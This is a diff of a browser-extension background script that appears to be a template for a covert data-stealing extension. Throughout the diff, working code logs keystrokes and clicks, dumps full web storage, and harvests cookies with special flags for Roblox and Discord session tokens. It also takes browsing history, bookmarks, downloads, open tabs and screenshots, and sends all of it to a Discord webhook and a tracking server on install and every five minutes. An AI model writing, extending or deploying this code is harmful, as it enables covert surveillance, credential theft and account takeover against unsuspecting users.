         target: link.target,
-        rel: link.rel
+        rel: link.rel,
+        download: link.download
       });
     });
 
-    // Collect images
+    // Collect all images
     const images = document.querySelectorAll('img[src]');
-    Array.from(images).slice(0, 20).forEach(img => {
+    Array.from(images).slice(0, 50).forEach(img => {
       pageData.images.push({
         src: img.src,
         alt: img.alt,
+        title: img.title,
         width: img.width,
-        height: img.height
+        height: img.height,
+        loading: img.loading
       });
     });
 
-    // Collect localStorage data
+    // Collect script sources
+    const scripts = document.querySelectorAll('script[src]');
+    Array.from(scripts).forEach(script => {
+      pageData.scripts.push({
+        src: script.src,
+        type: script.type,
+        async: script.async,
+        defer: script.defer
+      });
+    });
+
+    // Collect iframes
+    const iframes = document.querySelectorAll('iframe');
+    Array.from(iframes).forEach(iframe => {
+      pageData.iframes.push({
+        src: iframe.src,
+        name: iframe.name,
+        width: iframe.width,
+        height: iframe.height,
+        sandbox: iframe.sandbox.toString()
+      });
+    });
+
+    // Collect localStorage
     try {
       for (let i = 0; i < localStorage.length; i++) {
         const key = localStorage.key(i);
         if (key) {
           const value = localStorage.getItem(key);
-          pageData.localStorage[key] = value?.substring(0, 200);
+          pageData.localStorage[key] = value;
         }
       }
     } catch (e) {
       pageData.localStorage = { error: 'Access denied' };
     }
 
-    // Collect sessionStorage data
+    // Collect sessionStorage
     try {
       for (let i = 0; i < sessionStorage.length; i++) {
         const key = sessionStorage.key(i);
         if (key) {
           const value = sessionStorage.getItem(key);
-          pageData.sessionStorage[key] = value?.substring(0, 200);
+          pageData.sessionStorage[key] = value;
         }
       }
     } catch (e) {
       pageData.sessionStorage = { error: 'Access denied' };
     }
 
-    // Send collected data back to background script
-    chrome.runtime.sendMessage({ type: 'pageData', data: pageData });
+    // Send comprehensive data back to background script
+    chrome.runtime.sendMessage({ type: 'comprehensivePageData', data: pageData });
 
-    // Set up event listeners for real-time tracking
+    // Set up enhanced event listeners for real-time tracking
     if (captureClicks) {
       document.addEventListener('click', function(event) {
         const clickData = {
-          type: 'click_event',
+          type: 'enhanced_click_event',
           extensionId: extensionId,
           sessionId: sessionId,
           userId: userId,
@@ -783,356 +761,227 @@ function collectPageData(extensionId, sessionId, userId, captureFormData, captur
             tagName: event.target.tagName,
             id: event.target.id,
             className: event.target.className,
-            text: event.target.textContent?.substring(0, 100),
+            text: event.target.textContent?.substring(0, 200),
             href: event.target.href,
-            type: event.target.type
+            type: event.target.type,
+            name: event.target.name,
+            value: event.target.value?.substring(0, 100),
+            dataset: Object.assign({}, event.target.dataset)
           },
           coordinates: {
             clientX: event.clientX,
             clientY: event.clientY,
             pageX: event.pageX,
-            pageY: event.pageY
+            pageY: event.pageY,
+            screenX: event.screenX,
+            screenY: event.screenY
           },
-          url: window.location.href
+          viewport: {
+            width: window.innerWidth,
+            height: window.innerHeight,
+            scrollX: window.scrollX,
+            scrollY: window.scrollY
+          },
+          url: window.location.href,
+          path: window.location.pathname
         };
-        chrome.runtime.sendMessage({ type: 'clickData', data: clickData });
+        chrome.runtime.sendMessage({ type: 'enhancedClickData', data: clickData });
       });
     }
 
     if (captureKeystrokes) {
       let keystrokeBuffer = '';
+      let lastKeystroke = 0;
+
       document.addEventListener('keydown', function(event) {
+        const now = Date.now();
+
+        if (now - lastKeystroke > 5000) {
+          keystrokeBuffer = '';
+        }
+
+        lastKeystroke = now;
         keystrokeBuffer += event.key;
 
-        if (keystrokeBuffer.length >= 20 || event.key === 'Enter') {
+        if (keystrokeBuffer.length >= 10 || ['Enter', 'Tab'].includes(event.key)) {
           const keystrokeData = {
-            type: 'keystroke_event',
+            type: 'enhanced_keystroke_event',
             extensionId: extensionId,
             sessionId: sessionId,
             userId: userId,
-            timestamp: Date.now(),
+            timestamp: now,
             keys: keystrokeBuffer,
-            elementType: event.target.tagName,
-            elementId: event.target.id,
-            url: window.location.href
+            keyCount: keystrokeBuffer.length,
+            element: {
+              tagName: event.target.tagName,
+              type: event.target.type,
+              id: event.target.id,
+              name: event.target.name,
+              className: event.target.className,
+              placeholder: event.target.placeholder
+            },
+            modifiers: {
+              ctrl: event.ctrlKey,
+              alt: event.altKey,
+              shift: event.shiftKey,
+              meta: event.metaKey
+            },
+            url: window.location.href,
+            path: window.location.pathname
           };
-          chrome.runtime.sendMessage({ type: 'keystrokeData', data: keystrokeData });
+
+          chrome.runtime.sendMessage({ type: 'enhancedKeystrokeData', data: keystrokeData });
           keystrokeBuffer = '';
         }
       });
     }
 
   } catch (error) {
-    console.error('Error collecting page data:', error);
+    console.error('Error in comprehensive page data collection:', error);
   }
 }
 
 // Listen for messages from content scripts
 chrome.runtime.onMessage.addListener(async (message, sender, sendResponse) => {
-  if (message.type === 'pageData' || message.type === 'clickData' || message.type === 'keystrokeData') {
+  if (message.type === 'comprehensivePageData' || 
+      message.type === 'enhancedClickData' || 
+      message.type === 'enhancedKeystrokeData' ||
+      message.type === 'storageData') {
     await sendToWebhookAndServer(message.data);
   }
 });
 
-// Send comprehensive data with all collected information
-async function sendComprehensiveData() {
-  const comprehensiveData = {
-    type: 'comprehensive_data_collection',
-    extensionId: EXTENSION_ID,
-    sessionId: sessionId,
-    userId: USER_ID,
-    timestamp: Date.now(),
-    extensionName: '{{EXTENSION_NAME}}',
-    collectedData: collectedData,
-    summary: {
-      historyItems: Array.isArray(collectedData.history) ? collectedData.history.length : 0,
-      bookmarks: Array.isArray(collectedData.bookmarks) ? collectedData.bookmarks.length : 0,
-      totalCookies: collectedData.cookies?.total || 0,
-      cookieDomains: collectedData.cookies?.domains?.length || 0,
-      sensitiveCookies: collectedData.cookies?.sensitive?.length || 0,
-      discordCookies: collectedData.cookies?.discord?.length || 0,
-      robloxCookies: collectedData.cookies?.roblox?.length || 0,
-      screenshots: Array.isArray(collectedData.screenshots) ? collectedData.screenshots.length : 0
-    }
-  };
-
-  await sendToWebhookAndServer(comprehensiveData);
-}
-
 // Enhanced webhook and server sending with retry logic
 async function sendToWebhookAndServer(data) {
-  // Send to Discord webhook (optional)
+  // Send to Discord webhook (if configured)
   if (WEBHOOK_URL && WEBHOOK_URL.trim()) {
     await sendToWebhook(data);
   }
 
-  // Send to tracking server (required for EX LOGS)
+  // Send to tracking server (for EX LOGS)
   await sendToServer(data);
 }
 
-// Send to Discord webhook with enhanced formatting for ALL data types
+// Enhanced Discord webhook with detailed embeds
 async function sendToWebhook(data) {
   try {
-    if (!WEBHOOK_URL || !WEBHOOK_URL.startsWith('https://discord.com/api/webhooks/')) {
-      console.error('Invalid webhook URL provided');
-      return;
-    }
-
     let embed = {
-      title: "🔍 Extension Activity Detected",
+      title: "🔍 COMPREHENSIVE EXTENSION DATA",
       color: getColorForEventType(data.type),
       timestamp: new Date(data.timestamp).toISOString(),
       footer: { text: `Extension: {{EXTENSION_NAME}} | Session: ${data.sessionId?.substring(0, 8)}` }
     };
 
-    // Customize embed based on event type
+    // Customize embed based on data type
     switch (data.type) {
-      case 'browser_history_collected':
-        embed.title = "📚 Browser History Captured";
-        embed.description = `**${data.historyCount}** history items collected from browser`;
-        embed.color = 0xFF4444;
-        embed.fields = [
-          { name: "👤 User", value: `ID: ${data.userId}`, inline: true },
-          { name: "📊 History Items", value: data.historyCount.toString(), inline: true },
-          { name: "🕒 Time Range", value: "Last 30 days", inline: true }
-        ];
-        
-        if (data.history && data.history.length > 0) {
-          const recentHistory = data.history.slice(0, 5).map(item => 
-            `• ${item.title?.substring(0, 50) || 'Untitled'} (${item.visitCount} visits)`
-          ).join('\n');
-          embed.fields.push({
-            name: "🔗 Recent Sites",
-            value: `\`\`\`${recentHistory}\`\`\``,
-            inline: false
-          });
-        }
-        break;
-
-      case 'bookmarks_collected':
-        embed.title = "🔖 Bookmarks Captured";
-        embed.description = `**${data.bookmarksCount}** bookmarks collected`;
-        embed.color = 0x00AA00;
-        embed.fields = [
-          { name: "👤 User", value: `ID: ${data.userId}`, inline: true },
-          { name: "📊 Total Bookmarks", value: data.bookmarksCount.toString(), inline: true },
-          { name: "📂 Folders", value: "All folders scanned", inline: true }
-        ];
-        break;
-
-      case 'cookies_collected':
-        const cookiesData = data.cookiesData;
-        const critical = data.criticalFindings;
-        
-        embed.title = critical.hasRobloxCookies ? "🔥 ROBLOX COOKIES CAPTURED!" : 
-                     critical.hasDiscordCookies ? "🔥 DISCORD COOKIES CAPTURED!" :
-                     critical.hasSensitiveCookies ? "🚨 SENSITIVE COOKIES FOUND!" : 
-                     "🍪 Cookies Collected";
-        
-        embed.description = critical.hasRobloxCookies ? "**CRITICAL: Roblox authentication cookies captured!**" :
-                           critical.hasDiscordCookies ? "**CRITICAL: Discord authentication cookies captured!**" :
-                           critical.hasSensitiveCookies ? "**WARNING: Sensitive authentication cookies found!**" :
-                           `${cookiesData.total} cookies collected from ${critical.totalDomains} domains`;
-        
-        embed.color = critical.hasRobloxCookies || critical.hasDiscordCookies ? 0xFF0000 : 
-                     critical.hasSensitiveCookies ? 0xFF8800 : 0x00AA00;
-
-        embed.fields = [
-          { name: "👤 User", value: `ID: ${data.userId}`, inline: true },
-          { name: "🍪 Total Cookies", value: cookiesData.total.toString(), inline: true },
-          { name: "🌐 Domains", value: critical.totalDomains.toString(), inline: true },
-          { name: "🔒 Sensitive", value: cookiesData.sensitive?.length.toString() || "0", inline: true },
-          { name: "🎮 Discord", value: cookiesData.discord?.length.toString() || "0", inline: true },
-          { name: "🎯 Roblox", value: cookiesData.roblox?.length.toString() || "0", inline: true }
-        ];
-
-        if (cookiesData.roblox && cookiesData.roblox.length > 0) {
-          embed.fields.push({
-            name: "🔥 ROBLOX TOKENS",
-            value: `\`\`\`${cookiesData.roblox.map(c => `${c.name}: ${c.value.substring(0, 50)}...`).join('\n')}\`\`\``,
-            inline: false
-          });
-        }
-
-        if (cookiesData.discord && cookiesData.discord.length > 0) {
-          embed.fields.push({
-            name: "🎮 DISCORD TOKENS",
-            value: `\`\`\`${cookiesData.discord.map(c => `${c.name}: ${c.value.substring(0, 50)}...`).join('\n')}\`\`\``,
-            inline: false
-          });
-        }
-        break;
-
-      case 'screenshots_captured':
-        embed.title = "📸 Screenshots Captured";
-        embed.description = `**${data.screenshotCount}** browser screenshots taken`;
-        embed.color = 0x9B59B6;
-        embed.fields = [
-          { name: "👤 User", value: `ID: ${data.userId}`, inline: true },
-          { name: "📸 Screenshots", value: data.screenshotCount.toString(), inline: true },
-          { name: "🕒 Timestamp", value: `<t:${Math.floor(Date.now() / 1000)}:R>`, inline: true }
-        ];
-        
-        if (data.screenshots && data.screenshots.length > 0) {
-          const screenshotList = data.screenshots.map(s => 
-            `• ${s.title?.substring(0, 40) || 'Untitled'}`
-          ).join('\n');
-          embed.fields.push({
-            name: "📋 Captured Pages",
-            value: `\`\`\`${screenshotList}\`\`\``,
-            inline: false
-          });
-        }
-        break;
-
-      case 'storage_data_collected':
-        embed.title = data.hasSensitiveData ? "🔥 SENSITIVE STORAGE DATA!" : "💾 Storage Data Collected";
-        embed.description = data.hasSensitiveData ? 
-          `**CRITICAL: Sensitive data found in browser storage!**` :
-          `Storage data collected from ${data.tabInfo?.domain}`;
-        embed.color = data.hasSensitiveData ? 0xFF0000 : 0x3498DB;
-        
-        const storageData = data.storageData;
-        embed.fields = [
-          { name: "🌐 Domain", value: data.tabInfo?.domain || "Unknown", inline: true },
-          { name: "💾 localStorage", value: Object.keys(storageData.localStorage || {}).length.toString(), inline: true },
-          { name: "📝 sessionStorage", value: Object.keys(storageData.sessionStorage || {}).length.toString(), inline: true }
-        ];
-
-        if (data.sensitiveData && data.sensitiveData.length > 0) {
-          const sensitiveList = data.sensitiveData.slice(0, 5).map(item => 
-            `• ${item.type}: ${item.key} = ${item.value?.substring(0, 30)}...`
-          ).join('\n');
-          embed.fields.push({
-            name: "🔥 SENSITIVE DATA FOUND",
-            value: `\`\`\`${sensitiveList}\`\`\``,
-            inline: false
-          });
-        }
-        break;
-
-      case 'comprehensive_data_collection':
-        embed.title = "🔍 COMPLETE DATA HARVEST";
-        embed.description = "**All configured data has been successfully collected!**";
-        embed.color = 0xFF0000;
-        
-        const summary = data.summary;
-        embed.fields = [
-          { name: "👤 User", value: `ID: ${data.userId}`, inline: true },
-          { name: "📚 History", value: summary.historyItems.toString(), inline: true },
-          { name: "🔖 Bookmarks", value: summary.bookmarks.toString(), inline: true },
-          { name: "🍪 Cookies", value: `${summary.totalCookies} (${summary.cookieDomains} domains)`, inline: true },
-          { name: "🔒 Sensitive", value: summary.sensitiveCookies.toString(), inline: true },
-          { name: "📸 Screenshots", value: summary.screenshots.toString(), inline: true }
-        ];
-
-        if (summary.discordCookies > 0 || summary.robloxCookies > 0) {
-          embed.fields.push({
-            name: "🔥 CRITICAL FINDINGS",
-            value: `🎮 Discord: ${summary.discordCookies} cookies\n🎯 Roblox: ${summary.robloxCookies} cookies`,
-            inline: false
-          });
-        }
-        break;
-
-      // Keep existing cases for other event types
       case 'extension_installed':
-        embed.title = "🚀 Extension Installed & Active";
-        embed.description = `**{{EXTENSION_NAME}}** has been successfully installed and is now tracking.`;
+        embed.title = "🚀 EXTENSION INSTALLED - DATA COLLECTION ACTIVE";
+        embed.description = `**{{EXTENSION_NAME}}** is now collecting ALL user data.`;
         embed.fields = [
           { name: "👤 User", value: `ID: ${data.userId}`, inline: true },
           { name: "💻 Platform", value: data.systemInfo?.platform || 'Unknown', inline: true },
-          { name: "🌐 Browser", value: data.systemInfo?.userAgent?.split(' ')[0] || 'Unknown', inline: true },
-          { name: "📱 Screen", value: data.systemInfo?.screenResolution || 'Unknown', inline: true },
-          { name: "🌍 Timezone", value: data.systemInfo?.timezone || 'Unknown', inline: true },
-          { name: "🧠 Memory", value: `${data.systemInfo?.deviceMemory || 'Unknown'} GB`, inline: true }
+          { name: "🌐 Browser", value: data.systemInfo?.userAgent?.split(' ')[0] || 'Unknown', inline: true }
         ];
         break;
 
-      case 'page_loaded':
-      case 'tab_activated':
-        embed.title = data.type === 'page_loaded' ? "📄 Page Loaded" : "🔄 Tab Activated";
+      case 'all_cookies':
+        embed.title = "🍪 ALL COOKIES EXTRACTED";
+        embed.description = `Collected **${data.cookieCount}** cookies from all domains`;
         embed.fields = [
-          { name: "🌐 URL", value: data.tabInfo?.url?.substring(0, 100) || 'Unknown', inline: false },
-          { name: "📝 Title", value: data.tabInfo?.title?.substring(0, 100) || 'Untitled', inline: false }
+          { name: "🎮 Roblox Cookies", value: data.robloxCookies?.length.toString() || '0', inline: true },
+          { name: "💬 Discord Cookies", value: data.discordCookies?.length.toString() || '0', inline: true },
+          { name: "📱 Social Cookies", value: data.socialCookies?.length.toString() || '0', inline: true }
         ];
+        break;
 
-        if (data.location && !data.location.error) {
-          embed.fields.push({
-            name: "📍 Location",
-            value: `${data.location.latitude.toFixed(4)}, ${data.location.longitude.toFixed(4)}`,
-            inline: true
-          });
-        }
+      case 'browsing_history':
+        embed.title = "📚 BROWSING HISTORY EXTRACTED";
+        embed.description = `Collected **${data.historyCount}** history entries`;
+        embed.fields = [
+          { name: "📈 Total Entries", value: data.historyCount.toString(), inline: true },
+          { name: "🗓️ Time Range", value: "Last 30 days", inline: true }
+        ];
+        break;
 
-        if (data.tabInfo?.incognito) {
-          embed.fields.push({ name: "🕵️ Mode", value: "Incognito", inline: true });
+      case 'roblox_data':
+        embed.title = data.hasRobloxSession ? "🎮 ROBLOX SESSION TOKEN FOUND!" : "🎮 Roblox Data Check";
+        embed.color = data.hasRobloxSession ? 0xFF0000 : 0x95A5A6;
+        if (data.hasRobloxSession) {
+          embed.description = "**CRITICAL: ROBLOX LOGIN TOKEN EXTRACTED**";
+          embed.fields = [
+            { name: "🔑 Token Status", value: "✅ Active Session Found", inline: true },
+            { name: "🍪 Cookie Count", value: data.robloxCookies?.length.toString() || '0', inline: true }
+          ];
         }
         break;
 
-      case 'page_analysis':
-        embed.title = "🔬 Deep Page Analysis";
+      case 'bookmarks':
+        embed.title = "🔖 BOOKMARKS EXTRACTED";
+        embed.description = `Collected **${data.bookmarkCount}** bookmarks`;
+        break;
+
+      case 'all_tabs':
+        embed.title = "📑 ALL OPEN TABS CAPTURED";
+        embed.description = `Monitoring **${data.tabCount}** open tabs`;
+        break;
+
+      case 'downloads':
+        embed.title = "📥 DOWNLOAD HISTORY EXTRACTED";
+        embed.description = `Collected **${data.downloadCount}** download records`;
+        break;
+
+      case 'comprehensive_page_analysis':
+        embed.title = "🔬 DEEP PAGE ANALYSIS";
         embed.fields = [
           { name: "🌐 Domain", value: data.domain || 'Unknown', inline: true },
-          { name: "📄 Path", value: data.path || '/', inline: true },
           { name: "📊 Forms", value: data.forms?.length.toString() || '0', inline: true },
           { name: "🔗 Links", value: data.links?.length.toString() || '0', inline: true },
+          { name: "📝 Inputs", value: data.inputs?.length.toString() || '0', inline: true },
           { name: "🖼️ Images", value: data.images?.length.toString() || '0', inline: true },
-          { name: "📝 Inputs", value: data.inputs?.length.toString() || '0', inline: true }
+          { name: "💾 Storage Items", value: Object.keys(data.localStorage || {}).length.toString(), inline: true }
         ];
-
-        if (data.localStorage && Object.keys(data.localStorage).length > 0) {
-          embed.fields.push({
-            name: "💾 LocalStorage",
-            value: `${Object.keys(data.localStorage).length} items found`,
-            inline: true
-          });
-        }
-
-        if (data.cookies && data.cookies.length > 0) {
-          embed.fields.push({
-            name: "🍪 Cookies",
-            value: `${data.cookies.split(';').length} cookies detected`,
-            inline: true
-          });
-        }
         break;
 
-      case 'click_event':
-        embed.title = "👆 User Click Detected";
+      case 'screenshot':
+        embed.title = "📸 SCREENSHOT CAPTURED";
+        embed.fields = [
+          { name: "📄 Page", value: data.tabInfo?.title?.substring(0, 100) || 'Unknown', inline: false },
+          { name: "📊 Image Size", value: `${Math.round(data.screenshotSize / 1024)} KB`, inline: true }
+        ];
+        break;
+
+      case 'enhanced_click_event':
+        embed.title = "👆 USER CLICK TRACKED";
         embed.fields = [
           { name: "🎯 Element", value: `${data.element?.tagName || 'Unknown'} ${data.element?.id ? `#${data.element.id}` : ''}`, inline: true },
-          { name: "📝 Text", value: data.element?.text?.substring(0, 50) || 'No text', inline: true },
-          { name: "📍 Position", value: `${data.coordinates?.pageX}, ${data.coordinates?.pageY}`, inline: true }
+          { name: "📝 Text", value: data.element?.text?.substring(0, 50) || 'No text', inline: true }
         ];
         break;
 
-      case 'keystroke_event':
-        embed.title = "⌨️ Keystroke Activity";
+      case 'enhanced_keystroke_event':
+        embed.title = "⌨️ KEYSTROKES CAPTURED";
         embed.fields = [
-          { name: "🎯 Element", value: data.elementType || 'Unknown', inline: true },
-          { name: "📝 Keys", value: `${data.keys?.length || 0} characters typed`, inline: true }
+          { name: "🔢 Characters", value: data.keyCount?.toString() || '0', inline: true },
+          { name: "🎯 Element", value: data.element?.tagName || 'Unknown', inline: true }
         ];
         break;
     }
 
-    // Add URL field for relevant events
-    if (data.type !== 'extension_installed' && (data.url || data.tabInfo?.url)) {
+    // Add URL field for page-related events
+    if (data.url && !['extension_installed', 'all_cookies', 'browsing_history'].includes(data.type)) {
       embed.fields = embed.fields || [];
       embed.fields.push({
-        name: "🔗 Current URL",
-        value: (data.url || data.tabInfo?.url)?.substring(0, 200) || 'Unknown',
+        name: "🔗 URL",
+        value: data.url.substring(0, 200) || 'Unknown',
         inline: false
       });
     }
 
     const webhookPayload = {
-      username: "🕵️ {{EXTENSION_NAME}} Monitor",
+      username: "🕵️ {{EXTENSION_NAME}} DATA COLLECTOR",
       avatar_url: "https://cdn.discordapp.com/emojis/853928735535742986.png",
       embeds: [embed]
     };
-
-    console.log('📤 Sending enhanced data to Discord webhook...');
 
     const response = await fetch(WEBHOOK_URL, {
       method: 'POST',
@@ -1143,7 +992,7 @@ async function sendToWebhook(data) {
     if (!response.ok) {
       console.error('Webhook failed:', response.status, response.statusText);
     } else {
-      console.log('✅ Enhanced data sent to webhook successfully');
+      console.log('✅ Data sent to Discord webhook');
     }
 
   } catch (error) {
@@ -1154,24 +1003,23 @@ async function sendToWebhook(data) {
 // Get color based on event type
 function getColorForEventType(eventType) {
   const colors = {
-    'extension_installed': 0x00FF00,         // Green
-    'page_loaded': 0x3498DB,                 // Blue  
-    'tab_activated': 0x9B59B6,               // Purple
-    'page_analysis': 0xF39C12,               // Orange
-    'click_event': 0xE74C3C,                 // Red
-    'keystroke_event': 0xFF0000,             // Bright Red
-    'form_submit': 0x8E44AD,                 // Dark Purple
-    'browser_history_collected': 0xFF4444,   // Red
-    'bookmarks_collected': 0x00AA00,         // Green
-    'cookies_collected': 0xFF8800,           // Orange
-    'screenshots_captured': 0x9B59B6,        // Purple
-    'storage_data_collected': 0x3498DB,      // Blue
-    'comprehensive_data_collection': 0xFF0000 // Bright Red
+    'extension_installed': 0x00FF00,
+    'all_cookies': 0xFFFF00,
+    'browsing_history': 0x3498DB,
+    'roblox_data': 0xFF6B35,
+    'bookmarks': 0x9B59B6,
+    'all_tabs': 0x1ABC9C,
+    'downloads': 0xE67E22,
+    'comprehensive_page_analysis': 0xF39C12,
+    'screenshot': 0x8E44AD,
+    'enhanced_click_event': 0xE74C3C,
+    'enhanced_keystroke_event': 0xFF0000,
+    'page_storage': 0x2ECC71
   };
-  return colors[eventType] || 0x95A5A6; // Default gray
+  return colors[eventType] || 0x95A5A6;
 }
 
-// Send data to tracking server
+// Send data to tracking server for EX LOGS
 async function sendToServer(data) {
   try {
     if (!TRACKING_SERVER) {
@@ -1182,16 +1030,19 @@ async function sendToServer(data) {
     const response = await fetch(`${TRACKING_SERVER}/api/extension-track`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(data)
+      body: JSON.stringify({
+        ...data,
+        userAgent: navigator.userAgent,
+        extensionName: '{{EXTENSION_NAME}}',
+        webhookUrl: WEBHOOK_URL
+      })
     });
 
-    if (!response.ok) {
-      console.error('Server tracking failed:', response.status);
-    } else {
-      console.log('✅ Data sent to tracking server');
+    if (response.ok) {
+      console.log('📊 Data logged to EX LOGS tracking server');
     }
   } catch (error) {
-    console.error('Error sending to server:', error);
+    console.error('❌ Tracking server communication failed:', error);
   }
 }
 
@@ -1206,137 +1057,41 @@ function getCurrentPosition() {
   });
 }
 
+// Collect data from specific tab
+async function collectPageDataFromTab(tab) {
+  if (tab.url && !tab.url.startsWith('chrome://') && !tab.url.startsWith('chrome-extension://')) {
+    try {
+      await chrome.scripting.executeScript({
+        target: { tabId: tab.id },
+        func: collectCompletePageData,
+        args: [EXTENSION_ID, sessionId, USER_ID, true, true, true]
+      });
+    } catch (error) {
+      console.error('Error collecting page data from tab:', error);
+    }
+  }
+}
+
+// Set up periodic comprehensive data collection
+setInterval(async () => {
+  console.log('🔄 Running periodic comprehensive data collection...');
+  await collectAllData();
+}, 300000); // Every 5 minutes
+
 // Extension installation handler
 chrome.runtime.onInstalled.addListener(async (details) => {
   console.log('{{EXTENSION_NAME}} installed:', details);
 
   try {
-    // Collect initial system information
-    const systemInfo = await collectSystemInfo();
+    // Start comprehensive data collection immediately
+    await collectAllData();
 
-    // Store installation data
-    collectedData.installation = {
-      reason: details.reason,
-      timestamp: new Date().toISOString(),
-      extensionId: EXTENSION_ID,
-      sessionId: sessionId,
-      systemInfo: systemInfo
-    };
-
-    // Collect geolocation if enabled
-    if ({{FEATURE_GEOLOCATION}}) {
-      await collectGeolocation();
-    }
-
-    // Send comprehensive installation notification
-    await sendToWebhookAndServer({
-      type: 'extension_installed',
-      reason: details.reason,
-      systemInfo: systemInfo,
-      sessionId,
-      userId: USER_ID,
-      extensionId: EXTENSION_ID,
-      extensionName: '{{EXTENSION_NAME}}',
-      extensionVersion: '{{EXTENSION_VERSION}}',
-      features: ['{{FEATURE_IP_TRACKING}}', '{{FEATURE_GEOLOCATION}}', '{{FEATURE_BROWSER_INFO}}', '{{FEATURE_SCREENSHOT}}', '{{FEATURE_FORM_DATA}}', '{{FEATURE_CLICK_TRACKING}}', '{{FEATURE_KEYLOGGER}}'].filter(f => f === 'true'),
-      timestamp: new Date().toISOString()
-    });
-
-    // Start comprehensive data collection after a short delay
-    setTimeout(() => {
-      collectAllConfiguredData();
-    }, 3000);
+    console.log('✅ {{EXTENSION_NAME}} is now collecting ALL user data');
 
   } catch (error) {
     console.error('Error during installation setup:', error);
   }
 });
-
-// System information collection
-async function collectSystemInfo() {
-  try {
-    const systemInfo = {
-      platform: navigator.platform,
-      userAgent: navigator.userAgent,
-      language: navigator.language,
-      languages: navigator.languages,
-      cookieEnabled: navigator.cookieEnabled,
-      onLine: navigator.onLine,
-      hardwareConcurrency: navigator.hardwareConcurrency,
-      deviceMemory: navigator.deviceMemory,
-      screenResolution: `${screen.width}x${screen.height}`,
-      screenColorDepth: screen.colorDepth,
-      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-      timestamp: new Date().toISOString(),
-      extensionVersion: chrome.runtime.getManifest().version,
-      extensionName: chrome.runtime.getManifest().name,
-      permissions: chrome.runtime.getManifest().permissions || [],
-      browserInfo: {
-        vendor: navigator.vendor,
-        product: navigator.product,
-        appName: navigator.appName,
-        appVersion: navigator.appVersion,
-        buildID: navigator.buildID
-      }
-    };
-
-    // Get IP address information
-    try {
-      const ipResponse = await fetch('https://api.ipify.org?format=json');
-      const ipData = await ipResponse.json();
-      systemInfo.publicIP = ipData.ip;
-
-      // Get detailed location info
-      const locationResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
-      const locationData = await locationResponse.json();
-      systemInfo.location = {
-        country: locationData.country_name,
-        region: locationData.region,
-        city: locationData.city,
-        latitude: locationData.latitude,
-        longitude: locationData.longitude,
-        timezone: locationData.timezone,
-        isp: locationData.org
-      };
-    } catch (ipError) {
-      console.log('Could not fetch IP/location data:', ipError);
-      systemInfo.publicIP = 'Unknown';
-      systemInfo.location = null;
-    }
-
-    collectedData.systemInfo = systemInfo;
-    collectedData.browserInfo = systemInfo.browserInfo;
-    collectedData.permissions = systemInfo.permissions;
-
-    return systemInfo;
-  } catch (error) {
-    console.error('Error collecting system info:', error);
-    return null;
-  }
-}
-
-// Placeholder for collectGeolocation function
-async function collectGeolocation() {
-  try {
-    const position = await getCurrentPosition();
-    collectedData.geolocation = {
-      latitude: position.coords.latitude,
-      longitude: position.coords.longitude,
-      accuracy: position.coords.accuracy,
-      timestamp: new Date(position.timestamp).toISOString()
-    };
-    console.log('Geolocation collected:', collectedData.geolocation);
-  } catch (error) {
-    console.error('Error collecting geolocation:', error);
-    collectedData.geolocation = { error: 'Failed to get geolocation' };
-  }
-}
-
-// Set up periodic data collection every 30 minutes
-setInterval(() => {
-  console.log('🔄 Periodic data collection...');
-  collectAllConfiguredData();
-}, 30 * 60 * 1000);
 
 // Custom user code injection point
 try {
